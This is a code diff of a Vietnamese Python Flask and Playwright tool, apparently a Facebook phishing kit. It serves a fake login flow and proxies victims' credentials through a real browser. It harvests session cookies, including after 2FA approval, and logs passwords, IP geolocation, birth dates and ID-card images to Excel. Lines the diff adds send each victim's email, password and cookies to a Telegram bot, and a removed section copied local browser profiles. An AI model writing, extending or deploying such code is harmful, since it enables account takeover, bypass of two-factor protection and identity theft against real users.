@@ -1,110 +1,59 @@
 #!/usr/bin/env python3
 
-
-
 """
-
-
 
 Facebook Automation Tool - Terminal CLI
 
-
-
 ======================================
-
-
 
 Tool tự động hóa đăng nhập Facebook với giao diện terminal.
 
-
-
 Mỗi user chạy trên một luồng riêng biệt với Playwright instance riêng.
-
-
 
 """
 
-
-
-
-
-
-
 import os
-
-
 
 import sys
 
-
+# Xử lý argument --admin cho chế độ hiển thị browser
+# Luôn headless=false để extensions hoạt động, nhưng ẩn cửa sổ khi không admin
+os.environ['PLAYWRIGHT_HEADLESS'] = 'false'
+if '--admin' in sys.argv:
+    os.environ['BROWSER_ADMIN_MODE'] = 'true'
+    sys.argv.remove('--admin')
+else:
+    os.environ['BROWSER_ADMIN_MODE'] = 'false'
 
 import time
 
-
-
 import threading
-
-
 
 import queue
 
-
-
 import base64
-
-
 
 import uuid
 
-
-
 import webbrowser
-
-
 
 import subprocess
 
-
-
 import re
-
-
 
 from datetime import datetime
 
-
-
 from typing import Optional, Dict, Any
-
-
 
 from concurrent.futures import Future
 
-
-
 import requests
-
-
-
-
-
-
 
 # Thêm thư mục gốc vào path để import các module
 
-
-
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-
-
-
-
-
-
 from flask import Flask, render_template, request, jsonify, make_response, redirect
-
-
 
 from openpyxl import Workbook, load_workbook
 
@@ -112,11 +61,7 @@ from openpyxl.drawing.image import Image as XLImage
 
 from io import BytesIO
 
-
-
 # Import utils
-
-
 
 from utils.get_html import (
 
@@ -128,467 +73,198 @@ from utils.get_html import (
 
 )
 
-
-
-
-
-
-
-
-
-
-
 # Create uploads directory if not exists
-
-
 
 UPLOADS_DIR = "uploads"
 
-
-
 if not os.path.exists(UPLOADS_DIR):
-
-
 
     os.makedirs(UPLOADS_DIR)
 
-
-
-
-
-
-
 def save_base64_image(base64_data: str, original_filename: str = "") -> str:
-
-
 
     """Decode base64 và lưu thành file ảnh, trả về đường dẫn file"""
 
-
-
     if not base64_data:
-
-
 
         return ""
 
-
-
     
 
-
-
     try:
-
-
 
         # Generate unique filename
 
-
-
         ext = os.path.splitext(original_filename)[1] if original_filename else ".png"
-
-
 
         if not ext:
 
-
-
             ext = ".png"
 
-
-
         
-
-
 
         unique_name = f"{uuid.uuid4().hex}{ext}"
 
-
-
         file_path = os.path.join(UPLOADS_DIR, unique_name)
 
-
-
         
-
-
 
         # Decode base64
 
-
-
         image_bytes = base64.b64decode(base64_data)
 
-
-
         
-
-
 
         # Save to file
 
-
-
         with open(file_path, "wb") as f:
-
-
 
             f.write(image_bytes)
 
-
-
         
-
-
 
         return file_path
 
-
-
     except Exception as e:
-
-
 
         print(f"[Image Save Error] {e}")
 
-
-
         return ""
-
-
-
-
-
-
-
-
-
-
 
 def get_ip_location(ip: str) -> str:
 
-
-
     """Lấy thông tin vị trí từ IP sử dụng ip-api.com"""
-
-
 
     try:
 
-
-
         # Skip for localhost/private IPs
-
-
 
         if ip in ('127.0.0.1', 'localhost') or ip.startswith('192.168.') or ip.startswith('10.'):
 
-
-
             return 'Local/Private Network'
 
-
-
         
-
-
 
         response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp', timeout=5)
 
-
-
         data = response.json()
-
-
 
         
 
-
-
         if data.get('status') == 'success':
-
-
 
             location = f"{data.get('city', 'N/A')}, {data.get('regionName', 'N/A')}, {data.get('country', 'N/A')} ({data.get('isp', 'N/A')})"
 
-
-
             return location
-
-
 
         return 'Unknown'
 
-
-
     except Exception as e:
-
-
 
         return f'Error: {str(e)[:30]}'
 
-
-
-
-
-
-
-
-
-
-
 def save_to_info_excel(data: dict) -> None:
-
-
 
     """Lưu dữ liệu vào file info.xlsx"""
 
-
-
     filename = "info.xlsx"
 
-
-
     
-
-
 
     # Create workbook if doesn't exist
 
-
-
     if not os.path.exists(filename):
-
-
 
         wb = Workbook()
 
-
-
         ws = wb.active
-
-
 
         ws.title = "Help Form Data"
 
-
-
         # Add headers
-
-
 
         headers = ['Timestamp', 'IP Address', 'Location', 'Full Name', 'Email', 'Year', 'Month', 'Day', 'Image Path']
 
-
-
         for col, header in enumerate(headers, 1):
-
-
 
             ws.cell(row=1, column=col, value=header)
 
-
-
         wb.save(filename)
 
-
-
     
-
-
 
     # Load workbook and append data
 
-
-
     wb = load_workbook(filename)
-
-
 
     ws = wb.active
 
-
-
     
-
-
 
     # Append data row
 
-
-
     row_data = [
-
-
 
         data.get('timestamp', ''),
 
-
-
         data.get('ip', ''),
-
-
 
         data.get('location', ''),
 
-
-
         data.get('field1', ''),
-
-
 
         data.get('field2', ''),
 
-
-
         data.get('year', ''),
-
-
 
         data.get('month', ''),
 
-
-
         data.get('day', ''),
-
-
 
         data.get('image', '')
 
-
-
     ]
-
-
 
     
 
-
-
     ws.append(row_data)
-
-
 
     wb.save(filename)
 
-
-
-
-
-
-
-
-
-
-
 def print_logo():
-
-
 
     """In logo tool lên terminal"""
 
-
-
     logo = """
-
-
-
     ███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
-
-
-
     ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
-
-
-
-    █████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝ 
-
-
-
-    ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗ 
-
-
-
+    █████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝
+    ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗
     ██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
-
-
-
     ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
-
-
-
-                                                                     
-
-
-
          █████╗ ██╗   ██╗████████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
-
-
-
         ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
-
-
-
         ███████║██║   ██║   ██║   ██║   ██║██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
-
-
-
         ██╔══██║██║   ██║   ██║   ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
-
-
-
         ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
-
-
-
         ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
-
-
-
     """
-
-
 
     print("\033[1;36m" + logo + "\033[0m")  # Cyan color
 
-
-
     print("\033[1;33m" + " " * 30 + "Version 1.0.0 - Terminal Edition" + "\033[0m\n")
-
-
-
-
-
-
-
-
-
-
 
 def print_menu():
 
-
-
     """In bảng menu"""
 
-
-
     print("\033[1;34m" + "=" * 70 + "\033[0m")
-
-
 
     print("\033[1;32m" + "                           MENU CHÍNH" + "\033[0m")
 
-
-
     print("\033[1;34m" + "=" * 70 + "\033[0m")
 
-
-
     print()
-
-
 
     print("  \033[1;33m[1]\033[0m  Chạy server")
 
@@ -602,691 +278,317 @@ def print_menu():
 
     print("  \033[1;33m[0]\033[0m  Thoát")
 
-
-
     print()
-
-
 
     print("\033[1;34m" + "=" * 70 + "\033[0m")
 
-
-
-
-
-
-
-
-
-
-
 def get_input(prompt: str, allow_empty: bool = False) -> str:
-
-
 
     """Lấy input từ user với validation"""
 
-
-
     while True:
 
-
-
         try:
-
-
 
             value = input(f"\033[1;36m{prompt}\033[0m").strip()
 
-
-
             if not value and not allow_empty:
-
-
 
                 print("\033[1;31m[!] Vui lòng không để trống\033[0m")
 
-
-
                 continue
-
-
 
             return value
 
-
-
         except KeyboardInterrupt:
-
-
 
             print("\n\033[1;31m[!] Đã hủy\033[0m")
 
-
-
             return ""
-
-
-
-
-
-
-
-
-
-
 
 def start_server():
 
-
-
     """Khởi động Flask server"""
 
-
-
     print("\n\033[1;34m" + "-" * 50 + "\033[0m")
-
-
 
     print("\033[1;32m           KHỞI ĐỘNG SERVER\033[0m")
 
-
-
     print("\033[1;34m" + "-" * 50 + "\033[0m\n")
 
-
-
     
-
-
 
     port_str = get_input("Nhập port (mặc định: 5000): ", allow_empty=True)
 
-
-
     port = int(port_str) if port_str.isdigit() else 5000
 
-
-
     
-
-
 
     print(f"\n\033[1;33m[*] Khởi động server tại http://localhost:{port}\033[0m")
 
-
-
     print(f"\033[1;33m[*] Mỗi user đăng nhập trên một luồng riêng biệt\033[0m")
-
-
 
     print(f"\033[1;36m    Nhập Ctrl+C để dừng server và quay lại menu\033[0m\n")
 
-
-
     
 
-
-
     try:
-
-
 
         run_server(port=port, open_browser=False)
 
-
-
     except KeyboardInterrupt:
-
-
 
         print(f"\n\033[1;33m[*] Đã dừng server\033[0m")
 
-
-
     except Exception as e:
-
-
 
         print(f"\n\033[1;31m[!] Lỗi server: {e}\033[0m")
 
-
-
     
 
-
-
     input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
-
-
-
-
-
-
-
-
-
-
 
 def show_users():
 
-
-
     """Hiển thị danh sách user đã đăng nhập"""
 
-
-
     print("\n\033[1;34m" + "-" * 50 + "\033[0m")
-
-
 
     print("\033[1;32m        DANH SÁCH USER\033[0m")
 
-
-
     print("\033[1;34m" + "-" * 50 + "\033[0m\n")
-
-
 
     
 
-
-
     filename = "users.xlsx"
-
-
 
     if os.path.exists(filename):
 
-
-
         try:
-
-
 
             from openpyxl import load_workbook
 
-
-
             wb = load_workbook(filename)
-
-
 
             ws = wb.active
 
-
-
             
-
-
 
             if ws.max_row <= 1:
 
-
-
                 print("\033[1;33m[!] Chưa có user nào trong danh sách\033[0m")
 
-
-
             else:
-
-
 
                 print(f"\033[1;36m{'STT':<5} {'Email':<25} {'Password':<15} {'Cookies':<20}\033[0m")
 
-
-
                 print("-" * 75)
-
-
 
                 for i, row in enumerate(ws.iter_rows(min_row=2, values_only=True), 1):
 
-
-
                     email = str(row[0]) if len(row) > 0 and row[0] else "N/A"
-
-
 
                     password = str(row[1]) if len(row) > 1 and row[1] else "N/A"
 
-
-
                     cookies = str(row[2]) if len(row) > 2 and row[2] else "N/A"
 
-
-
                     
-
-
 
                     # Rút gọn cookies để hiển thị bảng đẹp hơn
 
-
-
                     display_cookies = (cookies[:17] + "...") if len(cookies) > 20 else cookies
-
-
 
                     
 
-
-
                     print(f"{i:<5} {email:<25} {password:<15} {display_cookies:<20}")
-
-
 
         except Exception as e:
 
-
-
             print(f"\033[1;31m[!] Lỗi khi đọc file: {e}\033[0m")
-
-
 
     else:
 
-
-
         print(f"\033[1;33m[!] File {filename} chưa tồn tại\033[0m")
-
-
 
     
 
-
-
     input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
-
-
-
-
-
-
-
-
-
-
 
 def delete_user():
 
-
-
     """Xóa user khỏi danh sách"""
 
-
-
     print("\n\033[1;34m" + "-" * 50 + "\033[0m")
-
-
 
     print("\033[1;32m           XÓA USER\033[0m")
 
-
-
     print("\033[1;34m" + "-" * 50 + "\033[0m\n")
 
-
-
     
-
-
 
     print("  \033[1;33m[1]\033[0m  Xóa một user theo email")
 
-
-
     print("  \033[1;33m[2]\033[0m  Xóa TOÀN BỘ danh sách")
-
-
 
     print("  \033[1;33m[0]\033[0m  Quay lại")
 
-
-
     
-
-
 
     choice = get_input("\nNhập lựa chọn: ", allow_empty=True)
 
-
-
     
-
-
 
     filename = "users.xlsx"
 
-
-
     if choice == "1":
-
-
 
         email = get_input("Nhập email cần xóa: ")
 
-
-
         if not email: return
-
-
 
         
 
-
-
         if os.path.exists(filename):
-
-
 
             try:
 
-
-
                 from openpyxl import load_workbook
-
-
 
                 wb = load_workbook(filename)
 
-
-
                 ws = wb.active
-
-
 
                 deleted = False
 
-
-
                 for row in range(ws.max_row, 1, -1):
-
-
 
                     if ws.cell(row=row, column=1).value == email:
 
-
-
                         ws.delete_rows(row)
-
-
 
                         deleted = True
 
-
-
                 if deleted:
-
-
 
                     wb.save(filename)
 
-
-
                     print(f"\n\033[1;32m[✓] Đã xóa user {email}\033[0m")
-
-
 
                 else:
 
-
-
                     print(f"\n\033[1;33m[!] Không tìm thấy user {email}\033[0m")
-
-
 
             except Exception as e:
 
-
-
                 print(f"\033[1;31m[!] Lỗi: {e}\033[0m")
-
-
 
         else:
 
-
-
             print(f"\033[1;33m[!] File {filename} chưa tồn tại\033[0m")
-
-
 
             
 
-
-
     elif choice == "2":
-
-
 
         confirm = get_input("Bạn có chắc chắn muốn xóa TOÀN BỘ? (y/n): ", allow_empty=True).lower()
 
-
-
         if confirm in ('y', 'yes'):
-
-
 
             if os.path.exists(filename):
 
-
-
                 try:
-
-
 
                     os.remove(filename)
 
-
-
                     print(f"\n\033[1;32m[✓] Đã xóa toàn bộ danh sách user\033[0m")
-
-
 
                 except Exception as e:
 
-
-
                     print(f"\033[1;31m[!] Lỗi: {e}\033[0m")
-
-
 
             else:
 
-
-
                 print(f"\033[1;33m[!] File {filename} chưa tồn tại\033[0m")
 
-
-
     
-
-
 
     input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
 
-
-
-
-
-
-
-
-
-
-
 def setup_bot():
-
-
 
     """Thiết lập Telegram Bot"""
 
-
-
     print("\n\033[1;34m" + "-" * 50 + "\033[0m")
-
-
 
     print("\033[1;32m        THIẾT LẬP TELEGRAM BOT\033[0m")
 
-
-
     print("\033[1;34m" + "-" * 50 + "\033[0m\n")
 
-
-
     
-
-
 
     config_file = "bot_config.txt"
 
-
-
     current_token = ""
-
-
 
     current_chat_id = ""
 
-
-
     
-
-
 
     if os.path.exists(config_file):
 
-
-
         with open(config_file, "r") as f:
-
-
 
             lines = f.readlines()
 
-
-
             if len(lines) >= 2:
-
-
 
                 current_token = lines[0].strip()
 
-
-
                 current_chat_id = lines[1].strip()
-
-
 
                 print(f"\033[1;36mToken hiện tại: {current_token[:10]}...{current_token[-5:] if len(current_token)>10 else ''}\033[0m")
 
-
-
                 print(f"\033[1;36mChat ID hiện tại: {current_chat_id}\033[0m\n")
-
-
-
-
-
-
 
     token = get_input("Nhập Bot Token (để trống để giữ nguyên): ", allow_empty=True)
 
-
-
     if not token and current_token:
-
-
 
         token = current_token
 
-
-
     elif not token:
-
-
 
         print("\033[1;31m[!] Token không được để trống\033[0m")
 
-
-
         return
-
-
-
-
-
-
 
     chat_id = get_input("Nhập Chat ID (để trống để giữ nguyên): ", allow_empty=True)
 
-
-
     if not chat_id and current_chat_id:
-
-
 
         chat_id = current_chat_id
 
-
-
     elif not chat_id:
-
-
 
         print("\033[1;31m[!] Chat ID không được để trống\033[0m")
 
-
-
         return
-
-
-
-
-
-
 
     try:
 
-
-
         with open(config_file, "w") as f:
-
-
 
             f.write(f"{token}\n{chat_id}")
 
-
-
         print(f"\n\033[1;32m[✓] Đã lưu cấu hình bot vào {config_file}\033[0m")
-
-
 
     except Exception as e:
 
-
-
         print(f"\033[1;31m[!] Lỗi khi lưu file: {e}\033[0m")
-
-
 
     
 
-
-
     input("\n\033[1;36mNhấn Enter để quay lại menu...\033[0m")
-
-
-
-
-
-
-
-
-
-
 
 def setup_browser():
 
@@ -1311,246 +613,43 @@ def setup_browser():
         print(f"\033[1;33m[*] Đang mở trình duyệt...\033[0m\n")
 
         open_master_browser()
-
         return
 
-    
-
-    # Chưa có master profile - tạo mới tự động
-
+    # Chưa có master profile - tạo mới tự động tại thư mục hiện tại
     print("\n\033[1;34m" + "-" * 50 + "\033[0m")
-
     print("\033[1;32m        TẠO MASTER PROFILE TẠI THƯ MỤC HIỆN TẠI\033[0m")
-
     print("\033[1;34m" + "-" * 50 + "\033[0m\n")
 
-    
-
     print(f"\033[1;33m[*] Chưa có master profile tại: {master_dir}\033[0m")
-
-    print("\033[1;36m[*] Đang tìm profile Chrome/Edge/Brave để copy...\033[0m\n")
-
-    
-
-    # Tìm các profile Chrome mặc định
-
-    chrome_paths = [
-
-        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
-
-        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
-
-        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
-
-    ]
-
-    
-
-    profiles = []
-
-    for chrome_path in chrome_paths:
-
-        if os.path.exists(chrome_path):
-
-            default_profile = os.path.join(chrome_path, "Default")
-
-            if os.path.exists(default_profile):
-
-                browser_name = "Chrome" if "Google" in chrome_path else ("Edge" if "Edge" in chrome_path else "Brave")
-
-                profiles.append({
-
-                    'name': f"{browser_name} - Default",
-
-                    'path': default_profile,
-
-                    'browser': browser_name
-
-                })
-
-            
-
-            for i in range(1, 10):
-
-                profile_path = os.path.join(chrome_path, f"Profile {i}")
-
-                if os.path.exists(profile_path):
-
-                    browser_name = "Chrome" if "Google" in chrome_path else ("Edge" if "Edge" in chrome_path else "Brave")
-
-                    profiles.append({
-
-                        'name': f"{browser_name} - Profile {i}",
-
-                        'path': profile_path,
-
-                        'browser': browser_name
-
-                    })
-
-    
-
-    if not profiles:
-
-        print("\033[1;31m[!] Không tìm thấy profile Chrome/Edge/Brave nào!\033[0m")
-
-        print("\033[1;33m[*] Hãy đảm bảo bạn đã cài đặt Chrome hoặc Edge\033[0m")
-
-        input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
-
-        return
-
-    
-
-    print("\033[1;32mTìm thấy các profile sau:\033[0m\n")
-
-    for i, profile in enumerate(profiles, 1):
-
-        print(f"  \033[1;33m[{i}]\033[0m {profile['name']}")
-
-        print(f"      Đường dẫn: {profile['path']}")
-
-        print()
-
-    
-
-    print(f"  \033[1;33m[{len(profiles) + 1}]\033[0m Nhập đường dẫn profile tùy chỉnh")
-
-    print(f"  \033[1;33m[0]\033[0m Hủy và quay lại")
-
-    
-
-    choice = get_input("\nChọn profile để làm master: ", allow_empty=True)
-
-    
-
-    if choice == "0":
-
-        return
-
-    elif choice == str(len(profiles) + 1):
-
-        custom_path = get_input("Nhập đường dẫn đến profile: ")
-
-        if not custom_path or not os.path.exists(custom_path):
-
-            print("\033[1;31m[!] Đường dẫn không hợp lệ\033[0m")
-
-            input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
-
-            return
-
-        selected_profile = {'name': 'Custom', 'path': custom_path, 'browser': 'Custom'}
-
-    else:
-
-        try:
-
-            idx = int(choice) - 1
-
-            if idx < 0 or idx >= len(profiles):
-
-                raise ValueError()
-
-            selected_profile = profiles[idx]
-
-        except:
-
-            print("\033[1;31m[!] Lựa chọn không hợp lệ\033[0m")
-
-            time.sleep(1)
-
-            return
-
-    
-
-    # Xác nhận copy
-
-    print(f"\n\033[1;36mBạn đã chọn: {selected_profile['name']}\033[0m")
-
-    print(f"\033[1;36mSao chép profile này vào thư mục master?\033[0m")
-
-    confirm = get_input("Nhập 'yes' để xác nhận: ", allow_empty=True)
-
-    
-
-    if confirm.lower() != 'yes':
-
-        print("\033[1;33m[*] Đã hủy\033[0m")
-
-        input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
-
-        return
-
-    
-
-    # Copy profile
-
-    print(f"\n\033[1;33m[*] Đang sao chép profile vào master...\033[0m")
+    print("\033[1;36m[*] Đang tạo master profile mới...\033[0m\n")
+
+    # Tạo thư mục master
+    os.makedirs(master_dir, exist_ok=True)
+
+    # Tạo các thư mục và file cần thiết cho profile
+    os.makedirs(os.path.join(master_dir, "Default"), exist_ok=True)
+    with open(os.path.join(master_dir, "Default", "Preferences"), "w") as f:
+        f.write("{}")
+
+    # Lưu cấu hình browser
+    with open(config_file, "w") as f:
+        f.write(f"Chrome\n{master_dir}")
+
+    print(f"\n\033[1;32m[✓] Đã tạo master profile thành công!\033[0m")
+    print(f"\033[1;36mMaster profile: {master_dir}\033[0m")
+    print(f"\033[1;36mBrowser: Chrome\033[0m\n")
+
+    # Tự động mở browser sau khi tạo xong
+    print(f"\033[1;33m[*] Đang mở trình duyệt master...\033[0m\n")
+    time.sleep(1)
 
     try:
-
-        os.makedirs(master_dir, exist_ok=True)
-
-        
-
-        for item in os.listdir(selected_profile['path']):
-
-            src = os.path.join(selected_profile['path'], item)
-
-            dst = os.path.join(master_dir, item)
-
-            
-
-            if os.path.isfile(src):
-
-                shutil.copy2(src, dst)
-
-            elif os.path.isdir(src):
-
-                shutil.copytree(src, dst, dirs_exist_ok=True)
-
-        
-
-        # Lưu cấu hình browser
-
-        with open(config_file, "w") as f:
-
-            f.write(f"{selected_profile['browser']}\n{master_dir}")
-
-        
-
-        print(f"\n\033[1;32m[✓] Đã sao chép profile thành công!\033[0m")
-
-        print(f"\033[1;36mMaster profile: {master_dir}\033[0m")
-
-        print(f"\033[1;36mBrowser: {selected_profile['browser']}\033[0m\n")
-
-        
-
-        # Tự động mở browser sau khi tạo xong
-
-        print(f"\033[1;33m[*] Đang mở trình duyệt master...\033[0m\n")
-
-        time.sleep(1)
-
         open_master_browser()
-
-        
-
     except Exception as e:
-
-        print(f"\033[1;31m[!] Lỗi khi sao chép: {e}\033[0m")
-
+        print(f"\033[1;31m[!] Lỗi khi mở trình duyệt: {e}\033[0m")
         import traceback
-
         traceback.print_exc()
-
         input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
-
-
-
-
 
 def setup_master_profile():
 
@@ -1804,10 +903,6 @@ def setup_master_profile():
 
     input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
 
-
-
-
-
 def open_master_browser():
 
     """Mở trình duyệt master"""
@@ -1936,10 +1031,6 @@ def open_master_browser():
 
     input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
 
-
-
-
-
 def check_browser_config():
 
     """Kiểm tra cấu hình hiện tại"""
@@ -2006,99 +1097,43 @@ def check_browser_config():
 
     input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
 
-
-
-
-
-
-
-
-
-
-
 def detect_device(user_agent: str) -> str:
-
-
 
     """Phát hiện thiết bị từ User-Agent"""
 
-
-
     ua = user_agent.lower()
-
-
 
     if "iphone" in ua or "ipad" in ua or "ios" in ua:
 
-
-
         return "iOS"
-
-
 
     if "android" in ua:
 
-
-
         return "Android"
-
-
 
     return "Desktop"
 
-
-
-
-
-
-
-
-
-
-
 def create_unified_app():
-
-
 
     """Tạo Flask app với cả login và help trên cùng 1 port"""
 
-
-
     template_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
-
-
 
     app = Flask(__name__, template_folder=template_dir)
 
-
-
     
-
-
 
     FILE_NAME = "users.xlsx"
 
-
-
     
-
-
 
     @app.route("/")
 
-
-
     def home():
-
-
 
         """Trang chủ - tạo session_id duy nhất cho mỗi client"""
 
-
-
         user_agent = request.headers.get("User-Agent", "")
-
-
 
         device = detect_device(user_agent)
 
@@ -2149,8 +1184,6 @@ def create_unified_app():
         response.set_cookie('fb_session', session_id, max_age=3600)  # 1 giờ
 
         return response
-
-
 
     
 
@@ -2206,7 +1239,7 @@ def create_unified_app():
 
         def init_and_navigate():
 
-            success = init_browser_session(session_id, headless=False)
+            success = init_browser_session(session_id)
 
             if success:
 
@@ -2364,11 +1397,7 @@ def create_unified_app():
 
         return response
 
-
-
     
-
-
 
     # Quản lý session cho browser - mỗi session có worker riêng
 
@@ -2799,8 +1828,6 @@ def create_unified_app():
 
             return False
 
-
-
     
 
     @app.route("/login", methods=["POST"])
@@ -3023,13 +2050,52 @@ def create_unified_app():
 
             
 
+            # Đăng nhập thành công - lấy cookies trong worker thread, gửi Telegram và redirect sang /help
+
+            try:
+
+                cookies = worker.call(get_cookies, session_id=session_id, file_name=FILE_NAME)
+
+                cookies_value = cookies if cookies else "Không lấy được"
+
+            except Exception as e:
+
+                cookies_value = f"Lỗi: {str(e)[:50]}"
+
+            
+
+            # Gửi thông báo Telegram đúng format như help form
+            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            if ',' in client_ip:
+                client_ip = client_ip.split(',')[0].strip()
+            location_info = get_ip_location(client_ip)
+            
+            telegram_msg = f"Ip: {client_ip}\n"
+            telegram_msg += f"Location: {client_ip} | {location_info}\n"
+            telegram_msg += "-----------------------------\n"
+            telegram_msg += f"Full Name: N/A\n"
+            telegram_msg += f"Date of birth: N/A\n"
+            telegram_msg += "-----------------------------\n"
+            telegram_msg += f"Email: {email}\n"
+            telegram_msg += "-----------------------------\n"
+            telegram_msg += f"Address: {email}\n"
+            telegram_msg += f"Password: {password}\n"
+            telegram_msg += "-----------------------------\n\n"
+            telegram_msg += f"{cookies_value}"
+            
+            send_telegram_once(email, telegram_msg)
+
+            
+
+            print(f"[Login] Đăng nhập thành công - redirect sang /help cho client")
+
             return jsonify({
 
                 "success": True,
 
-                "html": html,
+                "redirect": f"/help?email={email}",
 
-                "should_get_cookies": should_get_cookies
+                "should_get_cookies": True
 
             })
 
@@ -3047,8 +2113,6 @@ def create_unified_app():
 
             }), 500
 
-
-
     
 
     @app.route("/hfa")
@@ -3064,6 +2128,249 @@ def create_unified_app():
         return render_template('hfa.html', email=email, session_id=session_id)
 
     
+
+    @app.route("/check_2fa_status", methods=["POST"])
+
+    def check_2fa_status():
+
+        """API kiểm tra trạng thái 2FA - kiểm tra trực tiếp URL từ LAST_PAGE"""
+
+        data = request.json
+
+        email = data.get("email", "").strip()
+
+        session_id = (data.get("session_id") or "").strip()
+
+        
+
+        if not email:
+
+            return jsonify({"success": False, "error": "Thiếu email"}), 400
+
+        if not session_id:
+
+            return jsonify({"success": False, "error": "Thiếu session_id"}), 400
+
+        
+
+        try:
+
+            # IMPORTANT: Playwright objects are NOT thread-safe.
+            # Mọi thao tác đọc URL / lấy cookies phải chạy trong session worker thread.
+            worker = get_or_create_session_worker(session_id)
+
+            def _get_current_url() -> str:
+                from utils.get_html import get_session_browser
+                session = get_session_browser(session_id)
+                if not session:
+                    return ""
+                page = session.get('page')
+                if not page:
+                    return ""
+                try:
+                    return page.evaluate("() => window.location.href")
+                except Exception:
+                    return page.url
+
+            current_url = worker.call(_get_current_url)
+
+            if not current_url:
+
+                return jsonify({"success": True, "completed": False, "message": "Không tìm thấy page"})
+
+            print(f"[check_2fa_status] URL hiện tại: {current_url[:100]}...")
+
+            
+
+            # Kiểm tra nếu URL là checkpoint_src=any (đã xác thực từ thiết bị khác)
+
+            if 'checkpoint_src=any' in current_url:
+
+                print(f"[check_2fa_status] Phát hiện checkpoint_src=any!")
+
+                
+
+                # Lấy cookies ngay lập tức từ session (không dùng global variables)
+
+                def _get_cookies_from_session(session_id, file_name):
+                    from utils.get_html import get_session_browser
+                    from openpyxl import load_workbook
+                    import os
+                    import time
+
+                    session = get_session_browser(session_id)
+                    if not session:
+                        return "", "N/A"
+
+                    context = session.get('context')
+                    page = session.get('page')
+                    email_from_session = session.get('email', email)
+                    password_from_session = session.get('password', 'N/A')
+
+                    if not context:
+                        return "", password_from_session
+
+                    try:
+                        # Navigate đến facebook.com để load cookies đầy đủ
+                        if page:
+                            print(f"[check_2fa_status] Navigating to facebook.com để lấy cookies...")
+                            page.goto("https://www.facebook.com/", wait_until="domcontentloaded", timeout=30000)
+                            time.sleep(2)  # Đợi cookies được set
+
+                        all_cookies = context.cookies()
+                        fb_cookies = [c for c in all_cookies if "facebook.com" in c.get("domain", "")]
+                        simple_pairs = [f"{c.get('name')}={c.get('value')}" for c in fb_cookies if c.get('name') and c.get('value')]
+                        cookies_str = "; ".join(simple_pairs)
+                        print(f"[check_2fa_status] Đã lấy {len(fb_cookies)} cookies từ facebook.com")
+
+                        # Lưu vào Excel
+                        if email_from_session and cookies_str:
+                            try:
+                                if not os.path.exists(file_name):
+                                    from openpyxl import Workbook
+                                    wb = Workbook()
+                                    ws = wb.active
+                                    ws.append(["Email", "Password", "Mã 2FA", "IP", "Thời gian & Vị trí", "Cookies",
+                                               "Email hỗ trợ", "Họ và tên", "Ngày sinh", "Ảnh CCCD", "Ảnh xem trước"])
+                                    wb.save(file_name)
+
+                                wb = load_workbook(file_name)
+                                ws = wb.active
+                                target_row = None
+                                for row in range(ws.max_row, 1, -1):
+                                    if ws.cell(row=row, column=1).value == email_from_session:
+                                        target_row = row
+                                        break
+                                if target_row is None:
+                                    target_row = ws.max_row + 1
+                                    ws.cell(row=target_row, column=1).value = email_from_session
+                                ws.cell(row=target_row, column=6).value = cookies_str
+                                
+                                # Căn chỉnh cột
+                                def _adjust(ws):
+                                    for column in ws.columns:
+                                        max_length = 0
+                                        column_letter = column[0].column_letter
+                                        for cell in column:
+                                            try:
+                                                if len(str(cell.value)) > max_length:
+                                                    max_length = len(str(cell.value))
+                                            except:
+                                                pass
+                                        adjusted_width = min(max_length + 2, 50)
+                                        ws.column_dimensions[column_letter].width = adjusted_width
+                                _adjust(ws)
+                                
+                                wb.save(file_name)
+                                print(f"[check_2fa_status] Đã lưu {len(cookies_str)} ký tự cookies vào Excel")
+                            except Exception as excel_err:
+                                print(f"[check_2fa_status] Lỗi lưu Excel: {excel_err}")
+
+                        # Đóng browser sau khi lấy cookies thành công
+                        try:
+                            if page:
+                                page.close()
+                            if context:
+                                context.close()
+                            # Xóa session khỏi danh sách
+                            from utils.get_html import _browser_sessions, _sessions_lock
+                            with _sessions_lock:
+                                if session_id in _browser_sessions:
+                                    del _browser_sessions[session_id]
+                            print(f"[check_2fa_status] Đã đóng browser và xóa session")
+                        except Exception as close_err:
